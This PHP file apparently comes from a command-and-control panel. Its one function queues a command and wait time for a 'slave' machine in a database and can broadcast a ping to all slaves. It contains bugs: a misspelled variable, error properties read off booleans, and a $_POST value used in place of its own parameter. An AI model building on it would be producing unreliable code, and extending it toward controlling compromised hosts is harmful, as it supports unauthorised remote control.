<?php 

function assignCommand($sid, $command, $conn) {
    if ($sid != "broadcast")
    {
        if (strpos($command, 'wait') && strpos($command, ' '))
        {
            $trimed = explode(" ", $command);
            if (is_numeric($trimed[1])) $waitTime = (int)$trimed[1];
            else $waitTime = 5;
        }
        else
        {
            $waitTime = 5;
        }
        $setCommand = $conn->prepare("update slaves set slaveCommand=?, slaveWaitTime=? where slaveId=?");
        if ($setCommand !== false)
        {
            $errorControl = $setCommand->bind_param("sss", $command, $waitTime, $_POST["sid"]);
            if ($errorControl !== false)
            {
                $errorControl = $setCommand->execute();
                if ($errorControl === false)
                {
                    return "An error occured: " . $errorControl->error;
                }
            }
            else
            {
                return "An error occured: " . $errorControl->error;
            }
        }
        else
        {
            return "An error occured: " . $setCommand->error;
        }
    }
    else
    {
        $broadcastCommand = $conn->prepare("update slaves set slaveCommand='ping',slaveStatus='offline'");
        if ($broadcastCommand !== false)
        {
            $errorControl = $broadcastCommand->execute();
            if ($erroControl === false)
            {
                return "An error occured: " . $errorControl->error;
            }
        }
        else
        {
            return "An error occured: " . $broadcastCommand->error;
        }
    }
}
?>
